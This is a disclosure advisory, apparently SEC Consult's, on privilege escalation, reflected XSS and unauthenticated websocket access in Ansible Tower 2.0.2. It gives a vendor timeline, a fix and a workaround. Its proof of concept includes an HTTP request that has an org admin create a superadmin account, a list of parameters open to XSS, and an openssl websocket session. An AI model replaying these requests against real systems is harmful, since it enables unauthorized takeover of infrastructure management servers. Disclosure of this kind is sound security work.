@@ -1,0 +1,190 @@
+SEC Consult Vulnerability Lab Security Advisory < 20150113-1 >
+=======================================================================
+              title: Privilege Escalation & XSS & Missing Authentication
+            product: Ansible Tower
+ vulnerable version: <=2.0.2
+      fixed version: >=2.0.5
+             impact: high
+           homepage: http://www.ansible.com/tower
+              found: 2014-10-15
+                 by: Manuel Hofer
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Ansible Tower is the easy-to-use UI and dashboard and REST API for Ansible.
+Centralize your Ansible infrastructure from a modern UI, featuring role-based
+access control, job scheduling, and graphical inventory management. Tower's
+REST API and CLI make it easy to embed Tower into existing tools and processes.
+Tower now includes real-time output of playbook runs, an all-new dashboard and
+expanded out-of-the-box cloud support."
+
+source: http://www.ansible.com/tower
+
+
+Business recommendation:
+------------------------
+Attackers are able to elevate privileges and gain full control over Ansible
+Tower and therefore access to sensitive data of other customers.
+
+It is assumed that further vulnerabilities exist as only a short crash test has
+been performed. Therefore it is recommended to perform a thorough security
+review by security professionals.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Privilege Escalation
+Ansible Tower provides the feature to create multiple organizations inside
+one tower instance. Each organization can have an unlimited number of users
+and administrators which are only allowed to perform actions in the context
+of their own organization. Due to missing validation of the "is_superuser"
+parameter during user creation, organization admins can create superadmin
+accounts and therefore elevate their privileges to gain full control of
+Ansible Tower.
+
+
+2) Reflected Cross-Site Scripting
+Several parts of the Ansible Tower API have been identified to be vulnerable
+against reflected XSS attacks which can be used by an attacker to steal user
+sessions.
+
+
+3) Missing Websocket Authentication / Information Leakage
+The Ansible Tower UI uses Websockets to notify clients about recent events.
+This part of the application lacks authentication as well as authorization,
+leading to internal data about e.g. scheduled events, being leaked to
+unauthorized and/or unauthenticated users.
+
+
+Proof of concept:
+-----------------
+1) Privilege Escalation (Org-Admin to Superadmin)
+Using the following request, a user with administrative privileges limited to an
+organization, can create a superadmin account with access to all organizations:
+
+> POST /api/v1/organizations/3/users/ HTTP/1.1
+> Host: $host
+> Authorization: Token c3f03841403a17ed79753e057167a62144dae7df
+> X-Auth-Token: Token c3f03841403a17ed79753e057167a62144dae7df
+>
+> {"first_name":"Org1admin_superuser","last_name":"Org1admin_superuser",
+> "email":"Org1admin_superuser@local.local","organization":3,
+> "username":"Org1admin_superuser","password":"Org1admin_superuser",
+> "password_confirm":"Org1admin_superuser","is_superuser":"true","ldap_user":""}
+
+
+2) Reflected Cross-Site Scripting
+The following URL parameters have been identified to be vulnerable against
+reflected cross-site scripting:
+ * URL: /api/v1/credentials/, Parameter: order_by
+ * URL: /api/v1/inventories/, Parameter: order_by
+ * URL: /api/v1/projects/, Parameter: order_by
+ * URL: /api/v1/schedules/, Parameter: next_run
+ * URL: /api/v1/users/3/permissions/, Parameter: order_by
+
+It is likely that similar issues exist in other parts of the application.
+
+
+3) Missing Websocket Authentication / Information Leakage
+An attacker can setup a websocket connection without providing any credentials
+as follows. By issuing a GET request to "https://tower:8080/socket.io/1/" the
+server responds with the following string:
+> 43167469538:60:60:websocket,xhr-multipart,htmlfilonp-polling[...]
+
+The first integer value can further be used to establish a websocket connection:
+#~% openssl s_client -verify 0 -connect tower:8080
+> GET /socket.io/1/websocket/43167469538 HTTP/1.1
+> Host: tower:8080
+> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Sec-WebSocket-Version: 13
+> Origin: https://tower
+> Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+> Connection: keep-alive, Upgrade
+> Pragma: no-cache
+> Cache-Control: no-cache
+> Upgrade: websocket
+>
+>
+
+The websocket key seen above, has been taken from the examples of the wikipedia
+page on WebSockets (http://de.wikipedia.org/wiki/WebSocket) as it is only used
+to verify that the server received and understood the message.
+
+The server responds as follows:
+< HTTP/1.1 101 Switching Protocols
+< Upgrade: websocket
+< Connection: Upgrade
+< Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
+
+Now that the websocket connection has been established, data that would
+otherwise be presented to logged in users to display status updates for "job
+related events" inside tower, can now be observed without any authentication.
+Following an example of data received through the websocket connection.
+> 5::/socket.io/jobs:{"args":{"status":"pending","project_id":56,
+> "unified_job_id":61,"event":"status_changed","endpoint":"/socket.io/jobs"},
+> "name":"status_changed"}
+
+Even tough no critical information has been identified leaking through the
+websocket, this should still be protected with proper authentication and
+authorization because it might aid an attacker in conducting further attacks.
+
+
+Vulnerable / tested versions:
+-----------------------------
+Ansible Tower version v2.0.2 has been tested which was the most recent version
+at the time of discovery.
+
+
+Vendor contact timeline:
+------------------------
+2014-10-22: Contacting vendor through security@ansible.com and asking for
+            cryptographic material in order to securely send advisory.
+2014-10-22: Sending unencrypted advisory as requested by vendor.
+2014-10-22: Vendor suggests to release a fix prior to 12.12.2014
+2014-10-28: Vendor confirms reported vulnerabilities
+2014-12-10: Vendor releases fixed Version 2.0.5
+2015-01-13: SEC Consult releases security advisory
+
+
+Solution:
+---------
+Upgrade to a fixed version of Ansible Tower >= 2.0.5
+
+
+Workaround:
+-----------
+For vulnerabilities 1 to 2, no workaround can be applied.
+3 can be circumvented by blocking access to TCP port 8080 on your
+Ansible Tower installation.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius - Zurich
+
+Headquarter:
+Mooslackengasse 17, 1190 Vienna, Austria
+Phone:   +43 1 8903043 0
+Fax:     +43 1 8903043 15
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+Interested to work with the experts of SEC Consult?
+Write to career@sec-consult.com
+
+EOF Manuel Hofer / 2015
